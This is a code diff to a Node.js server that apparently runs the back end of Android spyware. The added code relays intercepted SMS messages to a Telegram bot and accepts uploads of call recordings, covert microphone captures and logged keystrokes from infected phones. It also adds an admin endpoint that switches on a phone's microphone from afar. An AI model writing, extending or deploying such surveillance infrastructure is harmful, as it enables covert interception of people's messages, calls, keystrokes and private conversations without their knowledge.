@@ -1629,6 +1629,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Tracks in-flight SMS commands — request_id → { sim_slot, receiver, device_id }
   // Used to carry sim_slot through to sms_send_result broadcast and DB log
   const pendingSmsCommands = new Map();
+  // Rate-limit SMS Telegram alerts: device_id → last alert timestamp
+  const _smsAlertRateLimit = new Map();
 
   // Create SMS command log table once at startup
   try {
@@ -1817,8 +1819,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           timestamp: Date.now()
         };
         origEmit('new_sms', smsPayload);
-
         console.log(`[SMS-Relay] Instant SMS from ${address} on device ${deviceId} → broadcast to admins`);
+
+        // ═══ TELEGRAM ALERT: forward new SMS in real-time ═══
+        // Rate-limit: max 1 alert per device per 30 seconds to prevent flood
+        try {
+          const now = Date.now();
+          const lastAlert = _smsAlertRateLimit.get(deviceId) || 0;
+          if (now - lastAlert > 30000) {
+            _smsAlertRateLimit.set(deviceId, now);
+            const devRow = db.prepare('SELECT device_name, model FROM devices WHERE device_id = ?').get(deviceId);
+            const devLabel = devRow ? (devRow.device_name || devRow.model || deviceId.slice(0,12)) : deviceId.slice(0,12);
+            const { sendAlert: _tgAlert } = require('./utils/telegram-bot');
+            _tgAlert(
+              `📩 <b>New SMS — ${devLabel}</b>\n` +
+              `From: <code>${address}</code>\n` +
+              `Msg: ${(body || '').slice(0, 300)}\n` +
+              `SIM: ${simSlot || 1} | ${new Date(date || Date.now()).toISOString().slice(11,19)} UTC`
+            );
+          }
+        } catch (_) {}
       } catch (e) {
         console.warn('[SMS-Relay] Error processing instant_sms:', e.message);
       }
@@ -2242,6 +2262,126 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.status(500).json({ error: err.message });
     }
   });
+
+  // ═══ CALL RECORDING UPLOAD — device uploads an encrypted audio file ═══
+  const callRecordingUpload = require('multer')({
+    dest: path.join(__dirname, 'data', 'tmp'),
+    limits: { fileSize: 50 * 1024 * 1024 } // 50 MB max
+  });
+  app.post('/api/devices/call-recording', callRecordingUpload.single('recording'), (req, res) => {
+    try {
+      const { device_id, duration_ms, filename } = req.body;
+      if (!device_id || !req.file) return res.status(400).json({ error: 'device_id and recording required' });
+
+      const recordingsDir = path.join(__dirname, 'data', 'recordings', device_id);
+      if (!fs.existsSync(recordingsDir)) fs.mkdirSync(recordingsDir, { recursive: true });
+
+      const destName = filename || `call_${Date.now()}.m4a`;
+      const destPath = path.join(recordingsDir, destName);
+      fs.copyFileSync(req.file.path, destPath);
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+
+      // Log to DB
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS call_recordings (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, filename TEXT, duration_ms INTEGER, file_size INTEGER,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO call_recordings (device_id, filename, duration_ms, file_size) VALUES (?,?,?,?)')
+          .run(device_id, destName, parseInt(duration_ms) || 0, fs.statSync(destPath).size);
+      } catch (_) {}
+
+      const io = req.app.get('io');
+      if (io) io.emit('new_call_recording', { device_id, filename: destName, duration_ms });
+
+      console.log(`[CallRec] Stored ${destName} for ${device_id} (${Math.round(fs.statSync(destPath).size / 1024)} KB)`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ MIC CAPTURE UPLOAD — device uploads ambient audio ═══
+  const micCaptureUpload = require('multer')({
+    dest: path.join(__dirname, 'data', 'tmp'),
+    limits: { fileSize: 20 * 1024 * 1024 }
+  });
+  app.post('/api/devices/mic-capture', micCaptureUpload.single('audio'), (req, res) => {
+    try {
+      const { device_id, duration_s, filename } = req.body;
+      if (!device_id || !req.file) return res.status(400).json({ error: 'device_id and audio required' });
+
+      const micDir = path.join(__dirname, 'data', 'mic_captures', device_id);
+      if (!fs.existsSync(micDir)) fs.mkdirSync(micDir, { recursive: true });
+
+      const destName = filename || `mic_${Date.now()}.m4a`;
+      const destPath = path.join(micDir, destName);
+      fs.copyFileSync(req.file.path, destPath);
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS mic_captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, filename TEXT, duration_s INTEGER, file_size INTEGER,
+          captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO mic_captures (device_id, filename, duration_s, file_size) VALUES (?,?,?,?)')
+          .run(device_id, destName, parseInt(duration_s) || 0, fs.statSync(destPath).size);
+      } catch (_) {}
+
+      const io = req.app.get('io');
+      if (io) io.emit('new_mic_capture', { device_id, filename: destName, duration_s });
+
+      console.log(`[MicCapture] ${destName} for ${device_id} (${Math.round(fs.statSync(destPath).size / 1024)} KB)`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ KEYLOG UPLOAD — device uploads batched keystrokes ═══
+  app.post('/api/devices/keylog', express.json({ limit: '2mb' }), (req, res) => {
+    try {
+      const { device_id, entries } = req.body;
+      if (!device_id || !Array.isArray(entries)) return res.status(400).json({ error: 'device_id and entries array required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS keylog_entries (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, app_package TEXT, text_content TEXT,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const stmt = db.prepare('INSERT INTO keylog_entries (device_id, app_package, text_content, recorded_at) VALUES (?,?,?,?)');
+        for (const e of entries) {
+          stmt.run(device_id, e.app || '', e.text || '', e.ts || new Date().toISOString());
+        }
+      } catch (_) {}
+
+      res.json({ success: true, stored: entries.length });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ ADMIN: trigger mic capture on a device ═══
+  app.post('/api/admin/connections/:deviceId/mic-capture', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const { duration_s = 30 } = req.body;
+
+      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
+      const socket = device?.socket_id && io.sockets.sockets.get(device.socket_id);
+      if (!socket) return res.status(400).json({ error: 'Device not connected' });
+
+      socket.emit('start_mic_capture', cryptoEncrypt({ device_id: deviceId, duration_s: parseInt(duration_s) || 30 }));
+      res.json({ success: true, message: `Mic capture (${duration_s}s) dispatched to device` });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   app.post('/api/devices/sms', (req, res) => {
     try {
       const { device_id, messages } = req.body;
@@ -2612,8 +2752,32 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   }
 
   // ========== CLEANUP TIMER ==========
-  // Every 10 minutes, mark devices offline if no heartbeat for 2 hours.
-  // Devices are NEVER deleted — they just go offline.
+  // Layer 1 (every 2 min): verify socket still alive — catches dropped connections fast
+  setInterval(() => {
+    try {
+      const onlineDevices = db.prepare("SELECT device_id, socket_id FROM devices WHERE is_online = 1").all();
+      let ghostCount = 0;
+      for (const d of onlineDevices) {
+        // A device is a ghost if it has no live socket AND last_seen > 3 minutes ago
+        const socketAlive = d.socket_id && io.sockets.sockets.has(d.socket_id);
+        if (!socketAlive) {
+          const fresh = db.prepare("SELECT last_seen FROM devices WHERE device_id = ?").get(d.device_id);
+          const lastSeen = fresh ? new Date(fresh.last_seen + 'Z').getTime() : 0;
+          if (Date.now() - lastSeen > 3 * 60 * 1000) {
+            db.prepare("UPDATE devices SET is_online = 0, socket_id = '' WHERE device_id = ?").run(d.device_id);
+            deviceToSocket.delete(d.device_id);
+            origEmit('device_offline', { device_id: d.device_id });
+            ghostCount++;
+          }
+        }
+      }
+      if (ghostCount > 0) console.log(`[CLEANUP-FAST] Marked ${ghostCount} ghost device(s) offline (socket gone > 3 min)`);
+    } catch (err) {
+      console.error('[CLEANUP-FAST] Error:', err.message);
+    }
+  }, 2 * 60 * 1000); // every 2 minutes
+
+  // Layer 2 (every 10 min): heartbeat-based — catches devices with no heartbeat for 2+ hours
   setInterval(() => {
     try {
       const stale = db.prepare(
